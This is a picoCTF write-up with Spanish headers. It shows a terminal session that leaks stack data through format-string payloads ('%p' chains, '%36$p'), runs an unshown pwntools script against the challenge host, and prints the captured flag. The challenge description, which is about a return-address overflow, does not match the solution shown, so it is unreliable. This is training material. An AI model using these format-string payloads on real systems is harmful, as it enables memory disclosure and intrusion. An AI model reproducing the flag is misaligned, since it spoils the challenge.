
 
#### Description

Control the return addressNow we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/185/vuln).You can view source [here](https://artifacts.picoctf.net/c/185/vuln.c). And connect with it using `nc saturn.picoctf.net 60017`

## Pistas
This can be solved online if you don't want to do it by hand!



## Solución

``` 
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/hacking/Here/a]
└─$ echo BBBBBBBB > flag.txt
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/hacking/Here/a]
└─$ chmod +x ./vuln
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/hacking/Here/a]
└─$ ./vuln
Tell me a story and then I'll tell you one >> AAAAAAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
Here's a story - 
AAAAAAAA0xfffba1d0(nil)0x80493460x414141410x414141410x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x2570250x424242420x424242420xa0xf7ce095e0xf7c128440x804c0000x80494300xf7f24b800xfffba2b80xf7f038d00xf7e1e9b80xe98ad8000x3e80x804c0000x80494300x80494100x3e80x804c0000xfffba2b80x80494180xfffba2e00xf7ee96780xf7ee9b500x3e8
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/hacking/Here/a]
└─$ ./vuln
Tell me a story and then I'll tell you one >> %36$p
Here's a story - 
0x42424242
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/hacking/Here/a]
└─$ hola.py                   
hola.py: command not found
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/hacking/Here/a]
└─$ nano hola.py                                                                                
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/hacking/Here/a]
└─$ python3 hola.py                  
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/kali/.cache/.pwntools-cache-3.11/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] You have the latest version of Pwntools (4.9.0)
[*] '/home/kali/hacking/Here/a/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to saturn.picoctf.net on port 49985: Done
/home/kali/hacking/Here/a/hola.py:21: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.sendlineafter("Tell me a story and then I'll tell you one >> ", payload)
/home/kali/.local/lib/python3.11/site-packages/pwnlib/tubes/tube.py:823: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[*] picoCTF{L34k1ng_Fl4g_0ff_St4ck_64bf08ef}
[*] Closed connection to saturn.picoctf.net port 49985
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/hacking/Here/a]
└─$ 



```

## Bandera
Flag: picoCTF{L34k1ng_Fl4g_0ff_St4ck_64bf08ef}



## Notas adicionales


## Referencias
